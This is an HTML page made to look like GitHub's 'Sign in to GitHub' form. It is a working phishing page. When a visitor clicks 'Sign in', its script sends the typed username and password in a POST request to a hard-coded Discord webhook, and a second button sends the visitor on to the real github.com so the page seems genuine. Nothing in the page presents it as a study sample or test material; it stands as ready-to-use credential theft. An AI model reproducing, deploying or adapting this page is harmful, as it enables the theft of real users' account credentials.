<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 30px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #30363d;
            border-radius: 6px;
            background-color: #0d1117;
            color: #c9d1d9;
            font-size: 14px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #58a6ff;
        }
        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 30px;
        }
        button {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .signin-btn {
            background-color: #238636;
            color: white;
        }
        .signin-btn:hover {
            background-color: #2ea043;
        }
        .github-btn {
            background-color: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
        }
        .github-btn:hover {
            background-color: #30363d;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign in to GitHub</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username or email address</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="button-group">
                <button type="button" class="signin-btn" onclick="sendToWebhook()">Sign in</button>
                <button type="button" class="github-btn" onclick="goToGitHub()">GitHub</button>
            </div>
        </form>
    </div>

    <script>
        function sendToWebhook() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please fill in all fields');
                return;
            }
            
            fetch('https://discord.com/api/webhooks/1435620263223103554/2CXGI_dvlXC43ybfnUlqH-Nlm0bSoYnOQ2RG1OhaaJsRisVppl1HOOTfIuvMVTaLqsir', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                })
            });
        }
        
        function goToGitHub() {
            window.location.href = 'https://github.com';
        }
    </script>
</body>
</html>
